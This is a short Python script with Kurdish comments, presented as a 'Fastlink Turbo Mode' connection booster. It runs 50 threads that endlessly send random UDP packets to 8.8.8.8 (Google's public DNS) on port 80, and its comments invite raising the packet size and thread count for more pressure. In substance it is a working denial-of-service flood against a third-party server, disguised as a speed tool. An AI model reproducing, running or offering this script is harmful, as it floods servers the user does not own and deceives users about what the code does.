import socket
import threading
import random

# ئەم سکریپتە داتای بێ واتا دەنێرێت بۆ سێرڤەری گشتی بۆ چالاککردنی هێڵەکە
target_ip = "8.8.8.8" # DNS ی گوگڵ وەک ئامانج
target_port = 80
bytes_size = 1024 # قەبارەی داتاکە (زیادی بکە بۆ فشارێکی زیاتر)

def fast_flood():
    data = random._urandom(bytes_size)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_ip, target_port))
            s.send(data)
            # ناردنی داتا بەبێ وەستان
        except:
            pass

# دروستکردنی چەند "Thread"ێک بۆ ئەوەی فشارەکە زۆر بێت
print("--- Fastlink Turbo Mode Started ---")
print("Warning: This will consume a lot of data!")

for i in range(50): # ژمارەی ئەو هێزانەی کار دەکەن، دەتوانی زیادی بکەیت
    thread = threading.Thread(target=fast_flood)
    thread.daemon = True
    thread.start()

while True:
    time_str = "Active..."
    print(time_str, end="\r")
